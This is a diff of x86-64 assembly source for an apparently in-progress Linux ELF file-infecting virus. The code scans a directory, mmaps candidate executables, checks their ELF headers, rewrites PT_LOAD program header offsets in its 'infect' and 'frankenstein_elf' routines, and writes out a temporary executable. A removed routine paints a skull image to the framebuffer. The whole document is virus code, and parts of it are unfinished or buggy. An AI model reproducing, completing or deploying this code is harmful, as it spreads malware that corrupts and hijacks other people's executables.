@@ -52,8 +52,8 @@ section .bss
 	endstruc
 
 	struc elf_phdr
-		.p_type			resw 1		;  uint32_t   
-		.p_flags		resw 1		;  uint32_t   
+		.p_type			resd 1		;  uint32_t   
+		.p_flags		resd 1		;  uint32_t   
 		.p_offset		resq 1		;  Elf64_Off  
 		.p_vaddr		resq 1		;  Elf64_Addr 
 		.p_paddr		resq 1		;  Elf64_Addr 
@@ -74,10 +74,6 @@ section .bss
      	.sh_addralign	resq 1		; uint64_t   
      	.sh_entsize		resq 1		; uint64_t   
 	endstruc
-
-
-
-	;root_dirent: resb linuxdirent_size
 
 
 
@@ -146,26 +142,22 @@ checkptloadfaillen equ $-checkptloadfail
 
 ;****************************************************************************************
 
-;elf_header: times 4 dq 0
-;file_stat_temp: times 17 dq 0
-;elf_filesize: dq 0 
+;variables used for phdr and shdr manipulation routines
+
 evaddr: dq 0
-
 oshoff: dq 0
-
 vxhostentry: dq 0
 vxoffset: dq 0
-
 ventry equ $_start 
 
 fd:	dq 0
-fdlen equ $-fd
+;fdlen equ $-fd
 ;framebuffer:
 ;	db `//dev//fb0`,0
 ;framebuflen equ $-framebuffer
 ;;
-STDOUT			equ 0x1
 
+STDOUT			equ 0x1
 
 ;open() syscall parameter reference 
 OPEN_RDWR		equ 0x2
@@ -193,28 +185,25 @@ MAP_PRIVATE		equ 0x2
 
 ;ELF header vals
 ELFCLASS64 		equ 0x2
-
-
 ETYPE_DYN		equ 0x3
 ETYPE_EXEC		equ 0x2
+ELFX8664		equ 0x3e
 
 ;D_TYPE values
 DT_REG 			equ 0x8
 
-
+;PHDR vals
 PT_LOAD 		equ 0x0100
 
-;MAX_RDENT_BUF:	db 0x200 dup (?)
 MAX_RDENT_BUF	times 0x800 db 0 
 MAX_RDENT_BUF_SIZE equ 0x800
 
-num_dir_entries resq 0x0
-root_dirent:	dq 0 
-;	istruc linuxdirent iend
-;times 0x400 db 0 
-;dw 0x200
+;num_dir_entries resq 0x0
+;root_dirent:	dq 0 
 
 ;;file pointed to by fstat is fd
+
+
 section .text
 global _start
 _start:
@@ -232,8 +221,6 @@ _getdirents:
 ;rdx == mode
 ;; returns: fd (in rax, obv)
 ;****************************************************************************************
-	;push "."
-	;pop rdi
 	mov rdi, targetdir
 	xor rsi, rsi 		;no flags
 	add rsi, 0x02000000
@@ -242,7 +229,6 @@ _getdirents:
 	syscall
 	
 	mov r9, rax						;fd into r9
-;	mov [fd], rax
 ;****************************************************************************************
 ; getdents64 - syscall 0x4e
 ;; getdents(unsigned int fd, struct linuxdirent *dirent, unsigned int count);
@@ -254,8 +240,6 @@ _getdirents:
 ;so we can iterate through all dirent entries using the size field in this dirent struc
 ;as an offset for successive jumps in address space	
 ;****************************************************************************************
-	;push r9
-	;pop rdi
 	mov rdi, rax
 	lea rsi, [r14 + 600 + linuxdirent] ;r14 + 600 is location on the stack where we'll save our dirent struct
 	mov rdx, MAX_RDENT_BUF_SIZE
@@ -263,9 +247,8 @@ _getdirents:
 	syscall
 
 
-	mov r8, rax					;# of dirent entries in r8
-;	mov [root_dirent], rsi
-	mov qword [r14 + 500], rax		;save # of dir entries to local var on stack
+	mov r8, rax						;save # of dirent entries in r8
+	mov qword [r14 + 500], rax		;also save # of dir entries to local var on stack
 ;****************************************************************************************
 ; close - syscall 0x3
 ;;close(fd);
@@ -276,6 +259,19 @@ _getdirents:
 	mov rax, SYS_CLOSE
 	syscall
 	
+	xor rcx, rcx	
+	jmp check_file
+	
+;****************************************************************************************
+; write - syscall 0x1
+;;rdi == fd (file descriptor)
+;;rsi == const char* buf
+;rdx == count (# of bytes to write)
+;; returns: 0 on success (-1 on error)
+;
+;	these routines are used for the bulk of the debug string printing
+;
+;****************************************************************************************
 ;	lea rsi,  [r14 + 600 + linuxdirent.d_nameq]
 ;	lea rdi, [r14 + 200] 
 ;	test_copy_filename:
@@ -284,19 +280,8 @@ _getdirents:
 ;		jne test_copy_filename
 ;	lea r13, [r14 + 200]
 ;	call _write
-	xor rcx, rcx	
-	jmp check_file
 
-;	jmp printteststr
-;****************************************************************************************
-; write - syscall 0x1
-;;rdi == fd (file descriptor)
-;;rsi == const char* buf
-;rdx == count (# of bytes to write)
-;; returns: 0 on success (-1 on error)
-;****************************************************************************************
 _write:
-		;lea rsi, [r14 + 600 + linuxdirent.d_nameq]
 		xor rsi, rsi
 		mov rdx, r12
 		mov rsi, r13
@@ -330,12 +315,7 @@ printteststr:
 check_file:
 	push rcx
 	;nvm d_type might not be available; use the macros for fstat instead
-	;cmp byte [rcx + r14 + 600 + linuxdirent.d_type + 1], DT_REG
-;	cmp byte [rcx + r14 + 600 + linuxdirent.d_type ], DT_REG
-	;cmp byte [rcx + r14 + 600 + linuxdirent.d_reclen - 1], DT_REG
-;	jne checknext 
 	check_elf:
-	;	push rcx
 		lea rdi, [rcx + r14 + 600 + linuxdirent.d_nameq]	;name of file in rdi
 		mov rsi, OPEN_RDWR 					;flags - read/write in rsi
 		xor rdx, rdx						;mode - 0
@@ -348,8 +328,7 @@ check_file:
 		mov r9, rax
 		mov r8, rax
 		mov [r14 + 144], rax
-		mov [fd], rax
-	;	pop rcx
+		;mov [fd], rax
 		
 		xor r12, r12
 		lea rdi, [r14 + 200] 
@@ -360,6 +339,7 @@ check_file:
 			cmp byte [rsi], 0x0
 			jne .copy_filename
 
+		;debug print check
 		;lea r13, [rcx + r14 + 600 + linuxdirent.d_nameq]
 		;lea r13, [r14 + 200]
 		;call _write
@@ -383,25 +363,11 @@ check_file:
 	
 	get_filestat:
 									;size for mmap == e_shoff + (e_shnum * e_shentsize)
-;		mov qword rsi, [elf_header + 40] ; e_shoff
-		;mov qword rsi, [r14+ elf_ehdr.e_shoff] ; e_shoff
-		;mov [elf_filesize], rsi; e_shoff
-		
-		;xor rax, rax
-		;mov ax, word [elf_header + 54]	;e_shnum
-		;mov r10w, word [elf_header + 56]	;e_shnum * e_shentsize
-		;mul r10w
-		;mov dword [elf_filesize], eax
-		;add rsi, dword [ax]
-		;mov [elf_filesize], rsi
-		;;mov rsi, r14
-		lea rsi, [r14 + filestat]
-		;mov rsi, [r14 + file_stat]
-		;lea rsi, [file_stat_temp]
+		lea rsi, [r14 + filestat]	;or retrieve size from filestat struct with an fstat syscall
 		mov rdi, r8
-		;mov rdi, [fd]
 		mov rax, SYS_FSTAT
 		syscall
+
 		;tbqf extracting this field and checking it is an infuriating piece of logic that is not working as expected
 		; since this is so annoying, I'm skipping this check for rn
 	
@@ -426,14 +392,9 @@ check_file:
 	mmap_file:
 		xor rdi, rdi			;set RDI to NULL
 		mov rsi, [r14 + filestat.st_size]
-		;mov rsi, [r14 + 48]
-		;mov qword rsi, [file_stat_temp.st_size]
-		;mov qword rsi, [r14 + file_stat.st_size]
-		;mov rsi, [r14 + filestat + 48]
 		mov rdx, 0x3 			; (PROT_READ | PROT_WRITE)
 		mov r10, MAP_PRIVATE
-		;mov r8, r9
-		;mov r8, fd				;fd is already in r8 so this mov is unnecessary
+		;mov r8, fd				;fd is already in r8 so we don't need to set that reg again
 		xor r9, r9				;offset of 0 within file == start of file, obv	
 		mov rax, SYS_MMAP
 		syscall
@@ -443,22 +404,17 @@ check_file:
 		pop r9
 	
 		mov r8, rax
-		;mov [r14 + 800 + elf_ehdr], rax			;rax contains address of new mapping upon return from syscall
 		mov [r14 + 800], rax			;rax contains address of new mapping upon return from syscall
 		push rax
 
 	close_curr_file:
-		;mov rdi, [r14+400]
 		mov rdi, r9
 		mov rax, SYS_CLOSE
 		syscall
 	
 		pop rax
 		test rax, rax
-		;cmp rax, 0
 		js checknext
-		;test rax, rax
-		;js checknext
 	check_elf_header_etype:
 		lea r13, checkelf_etype_fail
 		mov r12, checkelf_etype_faillen
@@ -469,50 +425,45 @@ check_file:
 		jnz checknext
 
 	check_elf_header_magic_bytes:
-		lea r13, checkelffail
-		mov r12, checkelffaillen
-		;cmp dword [r14 + 800 + elf_ehdr.e_ident], 0x464c457f
-		;cmp dword [r8 + elf_ehdr.e_ident], 0x464c457f
+		;debug print check
+		;lea r13, checkelffail
+		;mov r12, checkelffaillen
+		
 		cmp dword [rax + elf_ehdr.e_ident], 0x464c457f
-	
-		;lea rax, elf_header
-		;cmp dword [rax], 0x464c457f
-		;cmp dword [elf_header], 0x464c457f
 		jnz checknext
 		
+		;debug print check
 ;		lea r13, checkelfpass
 ;		mov r12, checkelfpasslen
 ;		call _write
+	
 	check_elf_header_64bit:
-		;cmp dword [r14+800+elf_ehdr.e_ident+4], ELFCLASS64
-		lea r13, check64fail
-		mov r12, check64faillen
+		;debug print check
+		;lea r13, check64fail
+		;mov r12, check64faillen
 		cmp byte [rax + elf_ehdr.e_ident+4], ELFCLASS64
-	;	cmp byte [elf_header+4], ELFCLASS64
-		;cmp byte [rax + elf_ehdr+4], ELFCLASS64
-		;cmp byte [rax + elf_ehdr+4], ELFCLASS64
-;		cmp byte [rax + elf_ehdr.ei_class], ELFCLASS64
 		jne checknext
 		
-		lea r13, check64pass
-		mov r12, check64passlen
-		call _write
+		;debug print check
+		;lea r13, check64pass
+		;mov r12, check64passlen
+		;call _write
 		jmp ready2infect
-;		jmp _restore
 	
 	check_elf_header_arch:
 		lea r13, checkarchfail
 		mov r12, checkarchfaillen
 		;cmp byte [elf_header+18], 0x3e
-		cmp byte [rax + elf_ehdr +18], 0x3e
+		;cmp byte [rax + elf_ehdr +18], 0x3e
+		cmp byte [r14+800+elf_ehdr + 18], ELFX8664
 		;cmp byte [rax + elf_ehdr.e_machine], 0x3e
 		;cmp word [rax + elf_ehdr.e_machine], 0x03e
 		jne checknext
 		
-		lea r13, checkarchpass
-		mov r12, checkarchpasslen
-		call _write
-		;jmp _restore
+		;debug print check
+		;lea r13, checkarchpass
+		;mov r12, checkarchpasslen
+		;call _write
 		
 	ready2infect:
 		push rax
@@ -630,15 +581,15 @@ infect:
 ;	lea r13, [rax + elf_ehdr]
 	;;mov r13, rax
 	mov r13, [r14+ 800]				;location on stack where we saved address returned from mmap syscall
-	jmp frankenstein_elf
-	mov r12, rax
-	lea r12, [rax + elf_ehdr.e_phoff]		;address of host ELF Program Header Table in r12
-	lea r15, [r13 + elf_ehdr.e_shoff] 	;address of host ELF Section Header Table in r15
-;	mov rdx, checkphdrstartlen
-;	lea rsi, checkphdrstart
-;	mov rdi, STDOUT
-;	mov rax, SYS_WRITE
-;	syscall
+	;jmp frankenstein_elf
+	;mov r12, rax
+	mov r12, [r13 + elf_ehdr.e_phoff]		;address of host ELF Program Header Table in r12
+	mov r15, [r13 + elf_ehdr.e_shoff] 	;address of host ELF Section Header Table in r15
+	mov rdx, checkphdrstartlen
+	lea rsi, checkphdrstart
+	mov rdi, STDOUT
+	mov rax, SYS_WRITE
+	syscall
 
 	
 ;;	mov qword r11, [rax + elf_ehdr.e_entry] ;save original host file entry point for jmp in vx code
@@ -654,18 +605,15 @@ infect:
 ;
 ;
 ;****************************************************************************************
-	;mov word rcx, [rax + elf_ehdr.e_phnum]
-	;mov rdx, [rax + elf_ehdr.e_phentsize]
-
 	xor rcx, rcx
+	mov word cx, [r13 + elf_ehdr.e_phnum]
+	mov rdx, [r13 + elf_ehdr.e_phentsize]
+
 	check_phdrs:
-		;push rcx
 		.phdr_loop:
 			;cmp rcx, 0
 			;jg .mod_subsequent_phdr		
-			;cmp word [r13 + r12 + elf_phdr.p_type], PT_LOAD			
-			cmp word [r12 + elf_phdr.p_type], 0x1			
-			;cmp [r12 ], word 0x1
+			cmp word [r12 + elf_phdr.p_type], PT_LOAD			
 			jne .mod_subsequent_phdr
 			.mod_curr_header:
 				mov rdx, checkptloadpasslen
@@ -690,17 +638,19 @@ infect:
 				mov rdi, STDOUT
 				mov rax, SYS_WRITE
 				syscall
-				add dword [r12 + elf_phdr.p_offset], PAGESIZE
+				;mov edi, dword [r12 + elf_phdr.p_offset]
+				;add edi, PAGESIZE
+				;mov dword [r12 + elf_phdr.p_offset], edi
 		.next_phdr:
-			;pop rcx
-			inc cx 
-			;add r12, rdx 
-			;add word r12d, [rax+ elf_ehdr.e_phentsize]
-			cmp word cx, [r13 + elf_ehdr.e_phnum]
+			dec cx 
+			;add r12w, dx 
+		;;	add r12d, dword [rax+ elf_ehdr.e_phentsize]
+			;cmp cx, word [r13 + elf_ehdr.e_phnum]
+			cmp cx, 0
 			;jg check_shdrs
-			jg frankenstein_elf
-			add word r12w, [r13 + elf_ehdr.e_phentsize]
-			jnz .phdr_loop			
+			;jnz .phdr_loop			
+			;je frankenstein_elf
+			;add word r12w, [r13 + elf_ehdr.e_phentsize]
 
 	jmp frankenstein_elf
 ;****************************************************************************************
@@ -783,12 +733,11 @@ infect:
 ;****************************************************************************************
 
 frankenstein_elf:
-	;mov r13, rax
 	mov rax, 0x00706d742e6f782e		;temp filename = ".xo.tmp\0"
 	mov [r14 + 0x800], rax
 	lea rdi, [r14 + 0x800]			;name of file in rdi
 	mov rsi, 0777o					;mode - 755 (file perms for new file)
-	;mov rsi, (O_CREAT | O_TRUNC | O_WRONLY)
+									;(O_CREAT | O_TRUNC | O_WRONLY)
 	mov rax, SYS_CREAT
 	syscall
 	
@@ -818,11 +767,7 @@ frankenstein_elf:
 
 
 fin_infect:
-;	add rsp, 0x8
-	;mov rsp, rbp
-	;pop rbp
 	ret
-
 
 
 ;;restore stack to original state
@@ -838,34 +783,5 @@ _end:
 	syscall	
 
 vlen equ $-_start
-
-;****************************************************************************************
-;	paint function, writes buffer of 4 byte values (R G B Alpha) pixels to framebuffer
-;	where framebuffer is a device at /dev/fb0
-;
-;****************************************************************************************
-;	
-;paint:
-;		mov rax, 0x3062662f7665642f  ;/dev/fb0 in little-endian
-;		mov [r14 + 100], rax
-;		lea rdi, [r14 + 100]
-;		xor rsi, rsi 		;no flags
-;		add rsi, 0x02000000
-;		mov rdx, O_RDONLY	;open read-only
-;		mov rax, SYS_OPEN
-;		syscall
-;		
-;		mov r9, rax
-;		mov rdi, rax
-;		mov rsi, skullbitmap
-;		mov rdx, paintlen
-;		mov rax, SYS_WRITE
-;		syscall
-;
-;		mov rdi, r9
-;		mov rax, SYS_CLOSE
-;		syscall
-;		ret
-	
 
 
